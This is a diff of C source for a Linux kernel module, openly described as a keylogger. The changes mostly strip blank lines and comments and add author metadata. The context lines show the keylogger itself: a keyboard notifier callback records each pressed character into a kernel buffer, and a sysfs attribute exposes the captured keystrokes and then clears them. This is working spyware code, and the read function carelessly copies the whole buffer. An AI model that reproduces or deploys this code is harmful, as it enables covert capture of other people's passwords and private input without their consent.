@@ -7,10 +7,6 @@
 #include <linux/uaccess.h>
 #include <linux/notifier.h>
 
-//#define DEVICE_NAME "key_log"  // the name of this device
-
-
-
 
 // Keylogger Info
 #define BUFFER_LEN 1024
@@ -20,29 +16,22 @@ int buf_pos = 0;  // Counting characters to avoid overflow
 int keyLog;
 static struct kobject *keyLog_obj;
 
-
-
 // Prototypes
 void keylog_exit(void);
 static ssize_t keyLog_show(struct kobject *kobj, struct kobj_attribute *attr,char *buf); 
 static int keys_pressed(struct notifier_block *, unsigned long, void *); // Callback function for the Notification Chain
-
 
 /*like read function return length of buffer. */
 static ssize_t keyLog_show(struct kobject *kobj, struct kobj_attribute *attr,char *buf)
 {
 	
 	int len = strlen(keys_buffer);
-	//int ret = copy_to_user(buf, keys_buffer, len); //Taking data from Kernel with COPY_TO_USER
 	memcpy(buf,keys_buffer,BUFFER_LEN);//copy to buf from keeys_buffer
-	
 	memset(keys_buffer, 0, BUFFER_LEN); // Reset buffer after each read this also helps to avoid overflow
 	keys_bf_ptr = keys_buffer; // Reset buffer pointer
 	return len;
 	
 }
-
-/***********************************************************************************/
 static int keys_pressed(struct notifier_block *nb, unsigned long action, void *data) {
 	
 	struct keyboard_notifier_param *param = data;
@@ -58,9 +47,6 @@ static int keys_pressed(struct notifier_block *nb, unsigned long action, void *d
 			*(keys_bf_ptr++) = c;
 			buf_pos++;
 		}
-		
-		
-		
 		// Beware of buffer overflows in kernel space!! They can be catastrophic!
 		//Prevents the OS to cracked in event of OVERFLOW
 		if (buf_pos >= BUFFER_LEN) {
@@ -72,9 +58,6 @@ static int keys_pressed(struct notifier_block *nb, unsigned long action, void *d
 		return NOTIFY_OK; // We return NOTIFY_OK, as "Notification was processed correctly"
 }
 
-
-
-
 /*Initializing the notifier_block
  * The notifier data structure is a simple linked list of function pointers.
  *  The function pointers are registered with ‘functions’ that are to be called when an event occurs. Each module needs to maintain a notifier list. 
@@ -84,9 +67,6 @@ static struct notifier_block nb = {
 	.notifier_call = keys_pressed
 }; 
 
-
-
-
 /*initialize the struct kobject_attribute (By value)*/
 static struct kobj_attribute keyLog_attr = {
 	.attr = {.name = "keyLog" ,
@@ -94,15 +74,11 @@ static struct kobj_attribute keyLog_attr = {
 			},
 	.show = keyLog_show
 	};
-	
-	
 /*Declare an array of this structures ,represent the file.*/
 static struct attribute *attrs[] = {
 	&keyLog_attr.attr,
 	NULL,	
 };
-
-
 
 /*To group those attributes. without this struct we cant use sysfs_create_group!
  * we insert *attrs[] to this struct.
@@ -157,9 +133,6 @@ register_keyboard_notifier(&nb);
  * BUFFER_LEN -> number of bytes to be copied
  * */
 memset(keys_buffer, 0, BUFFER_LEN);
-
-
-//printk(KERN_INFO "%s\n",keys_buffer);
 return 0;
 }
 
@@ -177,3 +150,6 @@ return 0;
 module_init(keylog_init);
 module_exit(keylog_exit);
 MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Yonatan Orozko & Ilona Geftner");
+MODULE_DESCRIPTION("Keylogger");
+MODULE_VERSION("1.0");
